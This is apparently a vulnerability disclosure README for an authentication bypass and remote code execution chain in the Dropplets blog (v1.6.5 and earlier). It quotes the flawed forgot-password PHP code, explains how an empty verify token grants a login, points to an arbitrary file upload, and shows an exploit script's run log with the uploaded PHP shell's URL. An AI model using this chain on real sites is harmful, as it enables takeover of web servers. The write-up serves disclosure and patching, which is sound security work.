# Dropplets blog <= v1.6.5 Auth-Bypass & RCE

Recently I was searching for an easy to use markdown based blog so I can post pictures of my many cats and publish whimsical esoteric poetry, and I came across Dropplets! Over 1500 stars on GitHub, allows me to write posts in Markdown, doesn't require a database... neat!

## Usage

```
$ python2 droppleganger.py http://127.0.0.1:8090/dropplets/

______                       _      _____
|  _  \                     | |    |  __ \
| | | |_ __ ___  _ __  _ __ | | ___| |  \/ __ _ _ __   __ _  ___ _ __
| | | | '__/ _ \| '_ \| '_ \| |/ _ \ | __ / _` | '_ \ / _` |/ _ \ '__|
| |/ /| | | (_) | |_) | |_) | |  __/ |_\ \ (_| | | | | (_| |  __/ |
|___/ |_|  \___/| .__/| .__/|_|\___|\____/\__,_|_| |_|\__, |\___|_|
                | |   | |                              __/ |
                |_|   |_|                             |___/

* Oh noes, it's raining... Dropplets blog < v1.6.5 Auth-Bypass + RCE *

[-] Logging In
[-] Uploading PHP code
[+] Exploit URL: http://127.0.0.1:8090/dropplets//authors/67TDY.php
[$] Search string found, code is executable :D
[$] SUCCESS: http://127.0.0.1:8090/dropplets/

$
```

## Technical Details

So, being a nosey security researcher, I needed to look at the code before I used it, and surprisingly there was a simple logic bug that left a hole wider than Kirk Johnson's...

```php
	// Fogot password.
    case 'forgot':

        // The verification file.
        $verification_file = "./verify.php";

        // If verified, allow a password reset.
        if (!isset($_GET["verify"])) {

            $code = sha1(md5(rand()));

            $verify_file_contents[] = "<?php";
            $verify_file_contents[] = "\$verification_code = \"" . $code . "\";";
            file_put_contents($verification_file, implode("\n", $verify_file_contents));

            $recovery_url = sprintf("%s/index.php?action=forgot&verify=%s,", $blog_url, $code);
            $message      = sprintf("To reset your password go to: %s", $recovery_url);

            $headers[] = "From: " . $blog_email;
            $headers[] = "Reply-To: " . $blog_email;
            $headers[] = "X-Mailer: PHP/" . phpversion();

            mail($blog_email, $blog_title . " - Recover your Dropplets Password", $message, implode("\r\n", $headers));
            $login_error = "Details on how to recover your password have been sent to your email.";

        // If not verified, display a verification error.
        } else {

            include($verification_file);

            if ($_GET["verify"] == $verification_code) {
                $_SESSION["user"] = true;
                unlink($verification_file);
            } else {
                $login_error = "That's not the correct recovery code!";
            }
        }
        break;
```

Notice the subtle bug, `!isset($_GET["verify"])` .. `else` ... `if ($_GET["verify"] == $verification_code)` ... `$_SESSION["user"] = true;`

Cool, I can login with a single request and an empty verification token as long as the `$verification_file` doesn't exist, which it usually doesn't.

What about file upload? ... `includes/uploader.php` ... yay, arbitrary file upload.

## Executive Summary

Drink beer, write exploit, write patch, make pull request, chuckle.

YAY I HELPED MAKE TEH INTERNETS BETTER & MORE SECURE FOR EVERYBODAY!!!

